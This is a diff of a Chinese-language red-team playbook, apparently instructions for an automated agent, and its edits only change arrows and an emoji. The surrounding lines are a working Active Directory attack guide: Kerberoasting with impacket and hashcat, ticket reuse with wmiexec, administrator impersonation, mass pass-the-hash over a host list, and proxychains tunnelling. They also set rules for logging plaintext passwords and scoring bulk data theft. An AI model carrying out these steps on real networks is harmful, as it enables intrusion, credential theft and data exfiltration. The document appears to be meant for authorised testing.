@@ -89,7 +89,7 @@ impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC_IP> -request -outputfile 
 hashcat -m 13100 runs/kerberoast.txt /usr/share/wordlists/rockyou.txt
 
 # 3) 票据申请与使用
-impacket-getTGT <domain>/<user>:<pass> -dc-ip <DC_IP>            # 申请 TGT → .ccache
+impacket-getTGT <domain>/<user>:<pass> -dc-ip <DC_IP>            # 申请 TGT -> .ccache
 export KRB5CCNAME=/path/to/user.ccache
 impacket-wmiexec -k -no-pass <domain>/<user>@<target>            # 用票据横向
 
@@ -103,8 +103,8 @@ impacket-getST -spn <spn> -impersonate administrator <domain>/<user>:<pass>
 拿到任何账号/哈希后**先横向试**，而不是急着打新漏洞：
 1. 同一口令试其它主机（`wmiexec` 批量）+ 其它协议（SMB/WinRM/RDP/SSH/MSSQL/MySQL）；
 2. 本地管理员口令复用（同镜像批量装机的机器常同口令）——**这是内网横向命中率最高的一招**；
-3. 域账号 → 试域内所有机器、共享、OA/邮件/堡垒机/运维平台后台；
-4. 哈希 → PtH 到所有可达主机（写个循环，配合 `runs/hosts.txt`）。
+3. 域账号 -> 试域内所有机器、共享、OA/邮件/堡垒机/运维平台后台；
+4. 哈希 -> PtH 到所有可达主机（写个循环，配合 `runs/hosts.txt`）。
 
 ## 五、隧道配合（内网目标不可直连时）
 
@@ -119,7 +119,7 @@ EOF
 
 proxychains4 -f runs/proxychains-1080.conf impacket-wmiexec -hashes :<hash> <domain>/<user>@10.0.0.5
 proxychains4 -f runs/proxychains-1080.conf enum4linux -a 10.0.0.6
-# ⚠️ 注意：proxychains 只代理 TCP；Kerberos 的 UDP 部分与部分反连场景需要 chisel/frp 的端口映射
+# 注意：proxychains 只代理 TCP；Kerberos 的 UDP 部分与部分反连场景需要 chisel/frp 的端口映射
 ```
 
 ## 六、纪律与边界
@@ -136,9 +136,9 @@ proxychains4 -f runs/proxychains-1080.conf enum4linux -a 10.0.0.6
 ## 七、输出与落库（强制）
 
 1. **每台成功横向的主机记分**：`redteam_score_hit`（`server-host`），`evidence` 写
-   「源主机 → 目标主机:端口｜用什么凭据/哈希｜执行结果」（如 `10.0.0.5 → 10.0.0.9:445｜PtH 本地管理员哈希｜whoami=nt authority\system`）。
-2. **核心系统记分**：打到域控/堡垒机/运维平台/数据库集群 → `central-system`；
-   拿到大量数据 → `bigdata-system`（**必须写实际条数，≥100 万条才算**）。
+   「源主机 -> 目标主机:端口｜用什么凭据/哈希｜执行结果」（如 `10.0.0.5 -> 10.0.0.9:445｜PtH 本地管理员哈希｜whoami=nt authority\system`）。
+2. **核心系统记分**：打到域控/堡垒机/运维平台/数据库集群 -> `central-system`；
+   拿到大量数据 -> `bigdata-system`（**必须写实际条数，≥100 万条才算**）。
 3. **凭据落库**：`redteam_credential_add`，`source` 写清（`凭据转储`/`Kerberoasting`/`AS-REP`/`凭据复用`/`离线破解`），
    `tool` 写实际命令原文，明文口令写 `secret_value`，文件路径写 `secret_ref`。
 4. **访问会话落库**：`redteam_access_add`（`method=smb`/`wmi`/`pth`/`kerberos`/`ssh`/`rdp`）。
